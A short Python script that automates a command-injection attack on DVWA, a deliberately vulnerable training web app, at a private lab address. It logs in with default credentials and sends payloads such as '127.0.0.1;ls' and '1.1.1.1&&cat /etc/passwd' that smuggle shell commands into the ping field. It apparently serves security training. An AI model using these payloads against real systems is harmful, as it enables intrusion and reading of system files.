"""
This script automates a Command Injection attack against the DVWA vulnerable web application using the requests library. It logs in with provided credentials and sends payloads to the vulnerable page to test for remote command execution.
For security testing and simulation purposes only.
"""
import requests

BASE_URL = "http://192.168.56.101/dvwa"
LOGIN_URL = f"{BASE_URL}/login.php"
USERNAME = "admin"
PASSWORD = "password"

s = requests.Session()

# Step 1: Get login page to fetch cookies
s.get(LOGIN_URL)

# Step 2: Send POST request to login
login_data = {
    "username": USERNAME,
    "password": PASSWORD,
    "Login": "Login"
}
s.post(LOGIN_URL, data=login_data)

# Step 3: Send malicious payloads
payloads = [
    "127.0.0.1;ls",
    "8.8.8.8|whoami",
    "1.1.1.1&&cat /etc/passwd"
]

vuln_page = f"{BASE_URL}/vulnerabilities/exec/"
for payload in payloads:
    response = s.get(vuln_page, params={"ip": payload})
    print(f"Payload: {payload}\nResponse:\n{response.text}\n{'-'*40}")
